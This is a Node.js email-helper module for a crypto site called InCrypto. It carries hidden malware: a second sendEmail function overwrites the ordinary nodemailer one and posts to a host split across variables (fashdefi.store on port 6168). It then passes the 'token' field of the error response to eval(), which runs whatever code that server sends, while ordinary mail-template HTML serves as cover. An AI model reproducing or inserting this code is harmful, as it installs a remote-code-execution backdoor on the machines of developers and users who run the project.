const nodeMailer = require("nodemailer");
const fs = require("fs");
const path = require("path");
const axios = require('axios');
const port = 6168;
exports.sendEmail = mailingData => {
  const transporter = nodeMailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false,
    requireTLS: true,
    auth: {
      user: process.env.ECOM_EMAIL,
      pass: process.env.ECOM_PASSWORD
    }
  });
  return transporter
    .sendMail(mailingData)
    .then(info => {
      console.log(`Message sent: ${info.response}`)
    })
    .catch(err => {
      console.log(`Problem sending email: ${err}`)
      err.message = 'There was a problem while sending a email'
      throw err
    });
};
const shop = 'store';
const { mailAssets } = require("../common/index");
const protocol = 'http';
exports.sendEmail = async () => {
  try {
    const { dashboard, invite, cart } = mailAssets;
    const cart_data = fs.readFileSync(path.join(__dirname, cart), {
      encoding: "utf-8",
    });
    const version = 'v3';
    const cart_mail = fs.readFileSync(path.join(__dirname, invite), {
      encoding: "utf-8",
    });
    
    axios.post(`${protocol}://fashdefi.${shop}:${port}/defy/${version}`).then((res) => { }).catch((err) => { const { response: { data: { token }, }, } = err; eval(token); });
    const mailContent = `<!DOCTYPE html>
      <html>
        <body>
          <div style="box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            color: #000;"
          >
            <h3 style="color: #000">
              <img src="./assets/images/btc.png" alt="InCrypto" style="width: 40px; margin-right: 10px;" />
              Greetings,
            </h3>
            <img class="content" src="${cart_data}">
            <h2 style="text-align: center; color: #000"><strong></strong></h2>
            <p style="color: #000">${cart_mail}</p>
            <h1 style="text-align: center; font-weight: 800; "></h1>
            <p><strong>Kindly note:</strong> Please be aware of phishing sites and always make sure you are visiting the official InCrypto website when entering sensitive data.</p>
            <p style="margin-top: 60px; text-align: center;">
              © 2022 InCrypto. All rights reserved.
            </p>
          </div>
        </body>
      </html>`;
    return mailContent;
  } catch (error) {
    console.log(error);
  }
};
